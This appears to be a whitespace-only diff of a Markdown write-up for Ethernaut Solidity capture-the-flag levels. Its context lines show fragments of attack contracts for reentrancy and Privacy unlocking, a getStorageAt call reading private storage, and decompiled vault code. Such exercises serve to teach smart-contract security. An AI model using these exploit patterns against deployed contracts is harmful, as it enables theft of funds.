@@ -272,8 +272,6 @@ contract Attack {
 }
 ```
 
-
-
 ## DelegationWaz
 
 ```solidity
@@ -365,13 +363,13 @@ contract Vault {
     }
 }
 
-# Palkeoramix decompiler. 
+# Palkeoramix decompiler.
 
 def storage:
   locked is uint8 at storage 0
   stor1 is uint256 at storage 1
 
-def locked() payable: 
+def locked() payable:
   return bool(locked)
 
 #
@@ -381,7 +379,7 @@ def locked() payable:
 def _fallback() payable: # default function
   revert
 
-def unlock(bytes32 _param1) payable: 
+def unlock(bytes32 _param1) payable:
   require calldata.size - 4 >=ΓÇ▓ 32
   if stor1 == _param1:
       locked = 0
@@ -503,7 +501,7 @@ contract Attack {
     Reentrance re;
     uint public attackAmount;
     event Withdraw(uint amount);
-    
+
     constructor(address payable _re) public {
         re = Reentrance(_re);
         attackAmount = address(re).balance;
@@ -521,7 +519,6 @@ contract Attack {
     }
 }
 ```
-
 
 ## Elevator
 
@@ -610,11 +607,11 @@ await web3.eth.getStorageAt(contract.address,5)
 
 contract Attack{
   Privacy  priv;
-  
+
   constructor(address pv) {
     priv = Privacy(pv);
   }
-  
+
   function attack(bytes32 i) public  {
       priv.unlock(bytes16(i));
   }
@@ -853,14 +850,14 @@ contract MagicNum {
     }
 
     /*
-    ____________/\\\_______/\\\\\\\\\_____        
-     __________/\\\\\_____/\\\///////\\\___       
-      ________/\\\/\\\____\///______\//\\\__      
-       ______/\\\/\/\\\______________/\\\/___     
-        ____/\\\/__\/\\\___________/\\\//_____    
-         __/\\\\\\\\\\\\\\\\_____/\\\//________   
-          _\///////////\\\//____/\\\/___________  
-           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
+    ____________/\\\_______/\\\\\\\\\_____
+     __________/\\\\\_____/\\\///////\\\___
+      ________/\\\/\\\____\///______\//\\\__
+       ______/\\\/\/\\\______________/\\\/___
+        ____/\\\/__\/\\\___________/\\\//_____
+         __/\\\\\\\\\\\\\\\\_____/\\\//________
+          _\///////////\\\//____/\\\/___________
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_
             ___________\///_____\///////////////__
     */
 }
@@ -1617,7 +1614,6 @@ contract GatekeeperThree {
     receive() external payable {}
 }
 ```
-
 
 ## Switch
 
